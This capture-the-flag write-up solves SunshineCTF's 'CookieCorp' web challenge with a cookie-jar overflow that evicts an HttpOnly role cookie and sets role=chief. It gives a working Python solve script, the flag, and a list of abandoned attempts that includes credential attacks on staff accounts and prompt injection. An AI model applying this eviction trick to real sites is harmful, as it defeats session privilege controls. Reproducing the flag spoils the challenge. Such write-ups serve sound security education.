# CookieCorp - Web (Medium)

**Flag:** `sun{c00kie_jar_0verfl0w_ev1cts_the_chief}`
**URL:** `https://tomorrow.web.2026.sunshinectf.games/` · author geo

## Challenge

> "A Better Cookie for a Brighter Tomorrow!"
>
> Welcome to CookieCorp, the Space Age's finest custom-cookie fabrication service. Design a batch
> from any ingredients you can dream up, then submit it to our tireless robotic Quality Inspector.
> Every recipe is loaded straight into the fabrication mixer for a full inspection.
>
> Get your batch reviewed and you'll earn an official seal. But the truly legendary bakers, the
> ones whose recipes earn the Chief's Golden Seal, take home the grand prize. Only the Chief can
> award that seal, though. And the Chief is a very busy robot.

## Initial Analysis

The app lets a baker create a recipe whose ingredients are `name=value` pairs. On submit, an
inspector bot visits `/review/{id}` and runs `mixer.js`:

```javascript
// mixer.js - logic chính
function dispense(ing) {
  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';
}

async function run() {
  // Set mỗi ingredient thành một browser cookie
  for (var i = 0; i < recipe.ingredients.length; i++) {
    dispense(recipe.ingredients[i]);
  }
  // Gọi /api/seal để stamp verdict - server check cookie "role"
  var resp = await fetch('/api/seal', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ recipeId: recipe.id }),
  });
}
```

What was measured:

- On login/register the server sets the cookie `role=baker; Path=/; HttpOnly; SameSite=Lax`.
- `HttpOnly` means `document.cookie` cannot overwrite the existing `role` cookie.
- The inspector bot carries its own `role` (not `chief`), so it only stamps the standard seal.
- The request to `/api/seal` needs `role=chief` to receive the Golden Seal containing the flag.
- Ingredient names and values are stripped of `;`, spaces and `=`, so no cookie attribute can be
  injected.

So there is no direct overwrite path. One option remains: make the old `role` cookie no longer exist
in the jar when the bot calls `/api/seal`.

## Exploit Chain

### Cookie jar overflow

Browsers cap the number of cookies per domain (~180 in Chromium). Past the limit the browser evicts
the oldest cookie, HttpOnly cookies included.

1. Create a recipe with **250 dummy ingredients** (named `x0000` through `x0249`) to overflow the
   cookie jar.
2. Append the `role=chief` ingredient at the end of the list.
3. When the bot runs `mixer.js`: the 250 new cookies overflow the jar, the old HttpOnly `role` cookie
   is evicted, then `role=chief` is set fresh from JavaScript.
4. The bot calls `/api/seal` with `role=chief` and receives the Golden Seal with the flag.

```python
import requests
import time

BASE = "https://tomorrow.web.2026.sunshinectf.games"
s = requests.Session()

# Register & login
s.post(f"{BASE}/register", json={"username": "solver_xyz", "password": "pass123"})

# Build 250 dummy ingredients + role=chief at the end
ingredients = [{"name": f"x{i:04d}", "value": f"v{i}"} for i in range(250)]
ingredients.append({"name": "role", "value": "chief"})

# Save recipe
r = s.post(f"{BASE}/api/recipe", json={
    "title": "Cookie Overflow",
    "ingredients": ingredients
})
recipe_id = r.json()["id"]
print(f"Recipe: {recipe_id}")

# Submit for bot review
s.post(f"{BASE}/api/recipe/{recipe_id}/submit")
print("Submitted, waiting for bot...")

# Wait for inspector bot to process
time.sleep(15)

# Check result
r = s.get(f"{BASE}/recipe/{recipe_id}")
if "sun{" in r.text:
    idx = r.text.index("sun{")
    end = r.text.index("}", idx)
    print(f"FLAG: {r.text[idx:end+1]}")
else:
    print("No flag yet, try refreshing")
```

```
Recipe: 4f8fdb4ccbdc2f8b78ade6c6
Submitted, waiting for bot...
FLAG: sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## Flag
```
sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## Investigation record

This folder keeps the whole exploration that happened before the flag, including the branches ruled
out (mass assignment, prototype pollution, NoSQL, SSTI/EJS, XSS through the sanitizer, prompt
injection into the title, credential attacks against usernames suspected to belong to staff) and the
watchers that tracked the jammed batch:

- `notes.md`, `notes-closed.md`, `analysis/` - the log of each hypothesis together with its `result: DEAD`
- `QUICK_REFERENCE.md`, `FINAL_SUMMARY.md` - tables of the app mechanics and the measured thresholds
- `files/` - per-page captures, `mixer.js`, logs of the scan rounds
- `solve_overflow.py` - the payload that took the flag (250 short ingredients + `role=chief` at the end of the list)
- `exploit.py` - the old branch: jamming the header **byte** by byte waiting for the Chief to rescan, not the winning path
- `analysis/overflow3.py`, `analysis/overflow_seal.py`, `files/overflow_run.log` - the probe rounds on the jar-overflow mechanism, recording even the faulty test that led eviction to be concluded as not happening
